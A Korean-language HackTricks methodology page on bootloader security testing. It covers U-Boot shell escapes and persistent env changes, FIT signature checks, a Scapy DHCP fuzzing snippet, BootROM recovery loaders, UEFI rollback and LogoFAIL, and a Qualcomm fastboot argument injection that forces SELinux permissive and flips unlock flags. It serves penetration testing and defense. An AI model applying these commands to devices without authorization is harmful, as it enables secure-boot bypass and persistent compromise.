# 부트로더 테스트

{{#include ../../banners/hacktricks-training.md}}

다음 단계들은 U-Boot 및 UEFI 클래스 로더 같은 부트로더를 테스트하고 장치 시작 구성(startup configurations)을 수정할 때 권장됩니다. 초기 코드 실행 확보, 서명/롤백 보호 평가, 복구 또는 네트워크 부팅 경로 악용에 중점을 두세요.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot 빠른 성공 및 환경 악용

1. 인터프리터 셸 접근
- 부팅 중 `bootcmd`가 실행되기 전에 알려진 중단 키(종종 아무 키, 0, space 또는 보드별 "매직" 시퀀스)를 눌러 U-Boot 프롬프트로 진입하세요.

2. 부트 상태 및 변수 검사
- 유용한 명령:
- `printenv` (환경 덤프)
- `bdinfo` (보드 정보, 메모리 주소)
- `help bootm; help booti; help bootz` (지원되는 커널 부팅 방식)
- `help ext4load; help fatload; help tftpboot` (사용 가능한 로더)

3. 루트 셸 얻기 위해 부트 인수 수정
- 커널이 일반 init 대신 셸로 떨어지도록 `init=/bin/sh`를 덧붙이세요:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. TFTP 서버에서 Netboot
- 네트워크를 구성하고 LAN에서 커널/FIT 이미지를 가져오세요:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. 환경을 통해 변경 사항 영구화
- env 저장소가 쓰기 보호되어 있지 않다면 제어를 영구화할 수 있습니다:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- fallback 경로에 영향을 주는 `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` 같은 변수를 확인하세요. 잘못 구성된 값은 셸로 반복적으로 진입하도록 허용할 수 있습니다.

6. 디버그/안전하지 않은 기능 확인
- 다음을 찾아보세요: `bootdelay` > 0, `autoboot` 비활성, 제한 없는 `usb start; fatload usb 0:1 ...`, 시리얼을 통한 `loady`/`loads` 가능성, 신뢰할 수 없는 매체로부터의 `env import`, 서명 검사 없이 로드되는 커널/ramdisk 등.

7. U-Boot 이미지/검증 테스트
- 플랫폼이 FIT 이미지를 사용해 보안/검증 부팅을 주장하면, 서명되지 않았거나 변조된 이미지를 시도하세요:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 또는 레거시 `verify=n` 동작이 없으면 임의 페이로드를 부팅할 수 있는 경우가 많습니다.

## Network-boot surface (DHCP/PXE) 및 악성 서버

8. PXE/DHCP 매개변수 퍼징
- U-Boot의 레거시 BOOTP/DHCP 처리는 메모리 안전성 문제를 가졌습니다. 예를 들어, CVE‑2024‑42040는 조작된 DHCP 응답을 통해 U-Boot 메모리에서 바이트를 네트워크로 leak할 수 있는 메모리 노출을 설명합니다. 너무 길거나 엣지케이스 값(option 67 bootfile-name, vendor options, file/servername 필드)으로 DHCP/PXE 코드 경로를 테스트하고 정지나 leak 현상을 관찰하세요.
- 부트 파라미터 스트레스를 주기 위한 최소한의 Scapy 스니펫:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- 또한 PXE 파일 이름 필드가 OS 측 프로비저닝 스크립트와 연결될 때 무결성 검증 없이 shell/loader 로직으로 전달되는지 검증하세요.

9. 악성 DHCP 서버 명령 인젝션 테스트
- 악성 DHCP/PXE 서비스를 구성하고 파일 이름 또는 옵션 필드에 문자를 주입해 부트 체인 후단의 명령 인터프리터에 도달할 수 있는지 시도하세요. Metasploit의 DHCP auxiliary, `dnsmasq`, 또는 맞춤형 Scapy 스크립트가 유용합니다. 실험실 네트워크를 격리하는 것을 잊지 마세요.

## 정상 부팅을 무시하는 SoC ROM 복구 모드

많은 SoC는 BootROM "loader" 모드를 노출하며, 플래시 이미지가 유효하지 않아도 USB/UART를 통해 코드를 수용합니다. secure-boot 퓨즈가 소거되지 않았다면, 이는 체인 초기에 임의 코드 실행을 제공할 수 있습니다.

- NXP i.MX (Serial Download Mode)
- 도구: `uuu` (mfgtools3) 또는 `imx-usb-loader`.
- 예: `imx-usb-loader u-boot.imx`로 커스텀 U-Boot를 RAM에서 실행.
- Allwinner (FEL)
- 도구: `sunxi-fel`.
- 예: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 또는 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- 도구: `rkdeveloptool`.
- 예: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`로 로더를 스테이지하고 커스텀 U-Boot 업로드.

장치에 secure-boot eFuses/OTP가 소각(burned)되어 있는지 평가하세요. 그렇지 않으면 BootROM 다운로드 모드가 고수준 검증(U-Boot, 커널, rootfs)을 우회하고 SRAM/DRAM에서 직접 귀하의 1차 페이로드를 실행하는 경우가 흔합니다.

## UEFI/PC 클래스 부트로더: 빠른 확인

10. ESP 변조 및 롤백 테스트
- EFI System Partition(ESP)을 마운트하고 로더 구성 요소를 확인하세요: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, 벤더 로고 경로 등.
- Secure Boot revocations (dbx)가 최신이 아니라면 다운그레이드되었거나 알려진 취약 서명된 부트 구성 요소로 부팅을 시도해 보세요. 플랫폼이 오래된 shim/bootmanager를 여전히 신뢰한다면 ESP에서 자체 커널이나 `grub.cfg`를 로드해 지속성을 얻을 수 있습니다.

11. 부트 로고 파싱 버그 (LogoFAIL 계열)
- 여러 OEM/IBV 펌웨어는 부트 로고를 처리하는 DXE의 이미지 파싱 결함에 취약했습니다. 공격자가 ESP의 벤더 특정 경로(예: `\EFI\<vendor>\logo\*.bmp`)에 조작된 이미지를 배치하고 재부팅하면, Secure Boot가 활성화되어 있어도 초기 부팅 중에 코드 실행이 가능할 수 있습니다. 플랫폼이 사용자 제공 로고를 수용하는지, 그리고 해당 경로가 OS에서 쓰기 가능한지 테스트하세요.

## Android/Qualcomm ABL + GBL (Android 16) 신뢰 격차

Android 16에서 Qualcomm의 ABL이 **Generic Bootloader Library (GBL)**을 로드하는 경우, ABL이 `efisp` 파티션에서 로드하는 UEFI 앱을 **인증(authenticates)** 하는지 확인하세요. ABL이 단지 UEFI 앱의 **존재(presence)**만 확인하고 서명을 검증하지 않으면, `efisp`에 쓸 수 있는 권한(write primitive)은 부팅 시 **OS 이전의 서명되지 않은 코드 실행(pre-OS unsigned code execution)** 으로 이어질 수 있습니다.

실용적 검사 및 악용 경로:

- **efisp write primitive**: `efisp`에 커스텀 UEFI 앱을 쓰기 위한 방법(root/privileged 서비스, OEM 앱 버그, recovery/fastboot 경로)이 필요합니다. 이것 없이는 GBL 로딩 격차에 직접 접근할 수 없습니다.
- **fastboot OEM argument injection** (ABL bug): 일부 빌드는 `fastboot oem set-gpu-preemption`에 추가 토큰을 허용하고 이를 커널 cmdline에 추가합니다. 이를 통해 SELinux를 permissive로 강제해 보호된 파티션 쓰기를 가능하게 할 수 있습니다:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
장치가 패치되어 있으면 명령이 추가 인수를 거부해야 합니다.
- **영구 플래그를 통한 부트로더 언락**: 부트 단계 페이로드는 persistent unlock 플래그(예: `is_unlocked=1`, `is_unlocked_critical=1`)를 뒤집어 `fastboot oem unlock` 없이도 OEM 서버/승인 없이 언락을 에뮬레이트할 수 있습니다. 이는 다음 재부팅 이후에도 지속되는 변화입니다.

방어/분류(triage) 노트:

- ABL이 `efisp`에서 로드되는 GBL/UEFI 페이로드에 대해 서명 검증을 수행하는지 확인하세요. 그렇지 않다면 `efisp`를 높은 위험의 지속성 표면으로 간주하세요.
- ABL fastboot OEM 핸들러가 인수 개수를 검증하고 추가 토큰을 거부하도록 패치되었는지 추적하세요.

## 하드웨어 주의

조기 부트 중 SPI/NAND 플래시와 상호작용할 때(예: 읽기를 우회하기 위해 핀을 접지하는 경우) 주의하고 항상 플래시 데이터시트를 참조하세요. 타이밍이 맞지 않는 쇼트는 장치나 프로그래머를 손상시킬 수 있습니다.

## 메모 및 추가 팁

- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 시도해 환경 블롭을 RAM과 저장소 간에 이동하세요; 일부 플랫폼은 인증 없이 제거 가능한 매체에서 env를 import할 수 있습니다.
- 서명이 강제되지 않는 경우 `extlinux.conf`로 부팅하는 Linux 기반 시스템에서는 부트 파티션의 `APPEND` 라인을 수정(`init=/bin/sh` 또는 `rd.break` 삽입)하는 것만으로도 충분할 때가 많습니다.
- userland에서 `fw_printenv/fw_setenv`를 제공한다면 `/etc/fw_env.config`가 실제 env 저장소와 일치하는지 검증하세요. 잘못된 오프셋은 잘못된 MTD 영역을 읽거나 쓰게 할 수 있습니다.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
